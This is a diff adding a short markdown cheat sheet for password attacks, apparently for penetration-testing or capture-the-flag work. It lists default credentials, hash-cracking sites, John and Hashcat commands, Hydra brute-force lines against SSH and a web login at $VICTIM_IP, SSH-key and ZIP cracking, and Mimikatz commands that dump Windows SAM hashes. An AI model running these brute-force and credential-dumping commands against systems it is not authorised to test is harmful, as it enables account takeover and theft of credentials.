@@ -1,0 +1,59 @@
+#### <span style="color:#FFB86C">Useful Links</span>
+- https://crackstation.net/ (cracking)
+- https://hashes.com/en/ (finding hash type)
+- https://hashes.com/en/decrypt/hash (decrypt)
+
+### <span style="color:#50FA7B">Default Passwords</span>
+
+```bash
+admin:admin
+root:root
+admin:password
+root:toor
+```
+### <span style="color:#50FA7B">Crack Hash with John</span>
+```bash
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+### <span style="color:#50FA7B">Crack Hash with Hashcat</span>
+```bash
+hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt --force
+```
+Use `hashid hash.txt` to find the hash type
+Example: `-m 0 = MD5`, `-m 1000 = NTLM`
+
+### <span style="color:#50FA7B">Brute Force SSH (Hydra)</span>
+```bash
+hydra -l user -P rockyou.txt ssh://$VICTIM_IP
+```
+### <span style="color:#50FA7B">Brute Force Web Login (Hydra)</span>
+```bash
+hydra -l user -P rockyou.txt $VICTIM_IP http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"
+```
+
+### <span style="color:#50FA7B">Crack SSH Private Key</span>
+
+```bash
+ssh2john id_rsa > ssh.hash
+john ssh.hash --wordlist=rockyou.txt
+```
+### <span style="color:#50FA7B">Dump Windows Hashes (Mimikatz)</span>
+```bash
+token::elevate
+lsadump::sam
+```
+Then crack:
+
+```bash
+hashcat -m 1000 hashes.txt rockyou.txt --force
+```
+### <span style="color:#50FA7B">Crack ZIP Password</span>
+```bash
+fcrackzip -u -D -p rockyou.txt file.zip
+```
+OR
+
+```bash
+zip2john file.zip > zip.hash
+john zip.hash
+```
